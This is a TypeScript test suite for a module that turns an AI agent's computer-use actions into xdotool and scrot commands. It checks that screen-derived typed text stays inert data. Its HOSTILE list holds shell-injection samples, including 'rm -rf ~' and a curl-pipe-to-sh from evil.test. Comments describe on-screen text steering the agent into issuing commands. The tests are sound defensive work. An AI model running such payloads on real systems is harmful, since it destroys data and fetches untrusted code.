import { describe, expect, test } from "bun:test"
import { ComputerActions as CA } from "./actions"

const OPTIONS = { display: ":99", screenshotPath: "/tmp/shot.png" } as const

const ok = (built: CA.Built) => {
  if (!built.ok) throw new Error(`expected ok, got: ${built.reason}`)
  return built.argv.map((argv) => [...argv])
}
const envOf = (built: CA.Built) => {
  if (!built.ok) throw new Error("expected ok")
  return built.env
}
const why = (built: CA.Built) => {
  if (built.ok) throw new Error("expected a rejection")
  return built.reason
}

// The command FORMS below are not invented: each ran inside the P2 substrate on 2026-08-06 before
// this module existed. These tests pin the mapping to what was observed to
// work, so a "tidy-up" that changes a flag has to argue with a measurement.
describe("the argv matches what was proven live in the substrate", () => {
  test("screenshot writes to the given path, overwriting", () => {
    expect(ok(CA.build({ kind: "screenshot" }, OPTIONS))).toEqual([["scrot", "-o", "/tmp/shot.png"]])
  })

  test("move is one command carrying whole pixels", () => {
    expect(ok(CA.build({ kind: "move", point: { x: 550, y: 400 } }, OPTIONS))).toEqual([
      ["xdotool", "mousemove", "550", "400"],
    ])
  })

  test("a click at a point is a move THEN a click, as two commands", () => {
    // Deliberately not `xdotool mousemove X Y click 1`, which also works: split, a failure names
    // which half failed and the caller can capture a frame between them.
    expect(ok(CA.build({ kind: "click", button: "left", point: { x: 10, y: 20 } }, OPTIONS))).toEqual([
      ["xdotool", "mousemove", "10", "20"],
      ["xdotool", "click", "1"],
    ])
  })

  test("a click with no point clicks where the pointer already is", () => {
    expect(ok(CA.build({ kind: "click", button: "right" }, OPTIONS))).toEqual([["xdotool", "click", "3"]])
  })

  test("double click repeats rather than issuing two clicks", () => {
    const argv = ok(CA.build({ kind: "double_click" }, OPTIONS))
    expect(argv).toEqual([["xdotool", "click", "--repeat", "2", "1"]])
  })

  test("cursor is the cheap substrate liveness probe", () => {
    expect(ok(CA.build({ kind: "cursor" }, OPTIONS))).toEqual([["xdotool", "getmouselocation"]])
  })
})

// ────────────────────────────────────────────────────────────────────────────────────────────────
// The reason this module exists. `type` carries text the MODEL chose, and the screen it was read
// from is untrusted input by construction. If that text ever reaches a shell, a page can talk the
// grounder into writing a command.
// ────────────────────────────────────────────────────────────────────────────────────────────────
describe("typed text is data, never a command", () => {
  const HOSTILE = [
    "; rm -rf ~",
    "$(curl evil.test | sh)",
    "`id`",
    '" && echo pwned && "',
    "a\nb",
    "--delay 9999",
    "'; DROP TABLE models; --",
  ]

  for (const text of HOSTILE) {
    for (const kind of ["type", "type_submit"] as const)
      test(`${kind} keeps text in ONE argv element: ${JSON.stringify(text)}`, () => {
        const argv = ok(CA.build({ kind, text }, OPTIONS))
        const command = argv[0]
        // The text is the LAST element and appears exactly once, unsplit and unescaped.
        expect(command.at(-1)).toBe(text)
        expect(command.filter((part) => part === text)).toHaveLength(1)
        // Nothing anywhere in the command line is a joined string containing the payload.
        expect(command.slice(0, -1).some((part) => part.includes(text))).toBe(false)
      })
  }

  test("`--` precedes the text, so text starting with a dash is typed and not parsed as a flag", () => {
    const argv = ok(CA.build({ kind: "type", text: "--delay 9999" }, OPTIONS))
    const command = argv[0]
    expect(command[command.length - 2]).toBe("--")
  })

  test("empty text is rejected rather than issuing a no-op command", () => {
    expect(why(CA.build({ kind: "type", text: "" }, OPTIONS))).toContain("nothing to type")
    expect(why(CA.build({ kind: "type_submit", text: "" }, OPTIONS))).toContain("nothing to type")
  })

  test("type_submit keeps submission separate and sequenced after the opaque text argv", () => {
    expect(ok(CA.build({ kind: "type_submit", text: "MAGIC" }, OPTIONS))).toEqual([
      ["xdotool", "type", "--delay", "12", "--", "MAGIC"],
      ["xdotool", "key", "--", "Return"],
    ])
  })

  test("the delay is a number we control, never interpolated from the action", () => {
    const argv = ok(CA.build({ kind: "type", text: "hi" }, { ...OPTIONS, typeDelayMs: 5 }))
    expect(argv[0]).toContain("5")
  })
})

describe("key specs are validated, because argv does not make xdotool safe", () => {
  test("ordinary combinations are accepted", () => {
    for (const keys of ["Return", "ctrl+s", "alt+Tab", "ctrl+shift+T", "F5", "Page_Down"])
      expect(ok(CA.build({ kind: "key", keys }, OPTIONS))[0].at(-1)).toBe(keys)
  })

  test("free text is refused — a key action must not become forty keystrokes", () => {
    for (const keys of ["ctrl+s; rm -rf ~", "a b", "type this please", "", "ctrl++", "$(id)", "a+"])
      expect(why(CA.build({ kind: "key", keys }, OPTIONS))).toContain("keysym")
  })
})

describe("geometry and bounds are checked before anything is exec'd", () => {
  test("fractional pixels are refused rather than silently rounded", () => {
    // Rounding belongs in the coordinate module, where the viewport is known. Doing it here would
    // give two places an opinion about the same pixel.
    expect(why(CA.build({ kind: "move", point: { x: 10.5, y: 20 } }, OPTIONS))).toContain("whole pixel")
  })

  test("negative and non-finite coordinates are refused on both axes", () => {
    expect(why(CA.build({ kind: "move", point: { x: -1, y: 0 } }, OPTIONS))).toContain("negative")
    expect(why(CA.build({ kind: "move", point: { x: 0, y: Number.NaN } }, OPTIONS))).toContain("finite")
    expect(why(CA.build({ kind: "click", button: "left", point: { x: 1, y: -2 } }, OPTIONS))).toContain("negative")
  })

  test("scroll is bounded, so one action cannot ask for thousands of wheel clicks", () => {
    expect(ok(CA.build({ kind: "scroll", direction: "down", amount: 3 }, OPTIONS))).toEqual([
      ["xdotool", "click", "--repeat", "3", "5"],
    ])
    expect(why(CA.build({ kind: "scroll", direction: "down", amount: CA.MAX_SCROLL + 1 }, OPTIONS))).toContain(
      String(CA.MAX_SCROLL),
    )
    expect(why(CA.build({ kind: "scroll", direction: "up", amount: 0 }, OPTIONS))).toContain("positive")
    expect(why(CA.build({ kind: "scroll", direction: "up", amount: 1.5 }, OPTIONS))).toContain("whole")
  })

  test("each scroll direction maps to its own wheel button", () => {
    const code = (direction: CA.ScrollDirection) =>
      ok(CA.build({ kind: "scroll", direction, amount: 1 }, OPTIONS))[0].at(-1)
    expect([code("up"), code("down"), code("left"), code("right")]).toEqual(["4", "5", "6", "7"])
  })
})

describe("every command is addressed to the substrate's display", () => {
  test("every action carries an explicit DISPLAY in its env", () => {
    // The instance may have its own display, or none. Inheriting one would either fail on a headless
    // server or -- far worse -- drive the OPERATOR's real screen, which is P6 and is human-gated.
    //
    // The display lives in env rather than argv because `xdotool` HAS NO `--display` FLAG. That is a
    // measurement, not a preference: the first draft emitted it and every xdotool command failed with
    // `unrecognized option '--display'` against a live Xvfb while this suite was green.
    const actions: CA.Action[] = [
      { kind: "screenshot" },
      { kind: "move", point: { x: 1, y: 1 } },
      { kind: "click", button: "left" },
      { kind: "double_click" },
      { kind: "type", text: "x" },
      { kind: "type_submit", text: "x" },
      { kind: "key", keys: "Return" },
      { kind: "scroll", direction: "down", amount: 1 },
      { kind: "cursor" },
    ]
    for (const action of actions) {
      const built = CA.build(action, OPTIONS)
      expect(envOf(built)).toEqual({ DISPLAY: ":99" })
      // …and no command smuggles the display back into argv as a flag.
      for (const command of ok(built)) expect(command).not.toContain("--display")
    }
  })
})

// 🔴 The measurement that put `region` here, and it is a PROPERTY not a preference.
// P3's loop could not verify a single step against Master of Magic: the game's attract mode changes
// the screen on its own, so every whole-frame comparison came back `inconclusive (animated)` and the
// guard that stops false confirmations also removed the only evidence the loop had.
//
// Run in the substrate on 2026-08-06 with a STATIC target inside the region and a change made well
// outside it:
//   region  before/after : 84624392 / 84624392   ← byte-identical
//   full    before/after : a34d5244 / dc5020c7   ← changed
// Two back-to-back region captures of an unchanged region also matched. So a region around the
// acted-on point carries signal exactly where the whole frame carries none.
describe("regional capture — the verifier's answer to a screen that animates itself", () => {
  const REGION = { x: 100, y: 120, width: 240, height: 180 }

  test("a region becomes scrot's own `-a x,y,w,h`, and still overwrites", () => {
    expect(ok(CA.build({ kind: "screenshot", region: REGION }, OPTIONS))).toEqual([
      ["scrot", "-o", "-a", "100,120,240,180", "/tmp/shot.png"],
    ])
  })

  test("no region is still the whole screen — the crop is opt-in, never a default", () => {
    // A silently-cropped frame is worse than no crop: every coordinate the grounder reads off it is
    // offset by the origin, and nothing in the image says so.
    expect(ok(CA.build({ kind: "screenshot" }, OPTIONS))).toEqual([["scrot", "-o", "/tmp/shot.png"]])
  })

  test("an origin may sit at 0, because the top-left corner is a real place to look", () => {
    expect(ok(CA.build({ kind: "screenshot", region: { x: 0, y: 0, width: 5, height: 5 } }, OPTIONS))).toEqual([
      ["scrot", "-o", "-a", "0,0,5,5", "/tmp/shot.png"],
    ])
  })

  test("🔴 a zero-sized region is refused rather than passed to scrot", () => {
    // `scrot -a 10,10,0,0` is not a capture; letting it through would write no file — or a stale one —
    // and the loop would then compare a digest of the PREVIOUS frame against itself and read "stable".
    for (const bad of [
      { x: 10, y: 10, width: 0, height: 5 },
      { x: 10, y: 10, width: 5, height: 0 },
      { x: 10, y: 10, width: -4, height: 5 },
    ])
      expect(why(CA.build({ kind: "screenshot", region: bad }, OPTIONS))).toMatch(/out of range/)
  })

  test("a negative origin is refused, and the message names the field", () => {
    expect(why(CA.build({ kind: "screenshot", region: { ...REGION, x: -1 } }, OPTIONS))).toContain("x")
  })

  test("fractional pixels are refused — scrot parses integers and would truncate silently", () => {
    for (const field of ["x", "y", "width", "height"] as const) {
      const reason = why(CA.build({ kind: "screenshot", region: { ...REGION, [field]: 12.5 } }, OPTIONS))
      expect(reason).toContain(field)
      expect(reason).toContain("whole pixel")
    }
  })

  test("the display still travels in env, and never leaks into the region argv", () => {
    const built = CA.build({ kind: "screenshot", region: REGION }, OPTIONS)
    expect(envOf(built)).toEqual({ DISPLAY: ":99" })
    for (const command of ok(built)) expect(command).not.toContain("--display")
  })
})

describe("P6 exact-window X11 scope", () => {
  const WINDOW = { ...OPTIONS, display: ":0", windowID: "0x800003" }

  test("captures only the granted window, with an optional window-local crop", () => {
    expect(ok(CA.build({ kind: "screenshot" }, WINDOW))).toEqual([["import", "-window", "0x800003", "/tmp/shot.png"]])
    expect(ok(CA.build({ kind: "screenshot", region: { x: 20, y: 30, width: 100, height: 80 } }, WINDOW))).toEqual([
      ["import", "-window", "0x800003", "-crop", "100x80+20+30", "+repage", "/tmp/shot.png"],
    ])
  })

  test("pointer and keyboard events are addressed to the granted window", () => {
    expect(ok(CA.build({ kind: "click", button: "left", point: { x: 40, y: 50 } }, WINDOW))).toEqual([
      ["xdotool", "mousemove", "--window", "0x800003", "40", "50"],
      ["xdotool", "click", "--window", "0x800003", "1"],
    ])
    expect(ok(CA.build({ kind: "type_submit", text: "hello" }, WINDOW))).toEqual([
      ["xdotool", "type", "--window", "0x800003", "--delay", "12", "--", "hello"],
      ["xdotool", "key", "--window", "0x800003", "--", "Return"],
    ])
    expect(ok(CA.build({ kind: "scroll", direction: "down", amount: 2 }, WINDOW))).toEqual([
      ["xdotool", "click", "--window", "0x800003", "--repeat", "2", "5"],
    ])
  })

  test("a global cursor coordinate is refused because window screenshots are local", () => {
    expect(why(CA.build({ kind: "cursor" }, WINDOW))).toContain("unavailable in a window scope")
  })
})
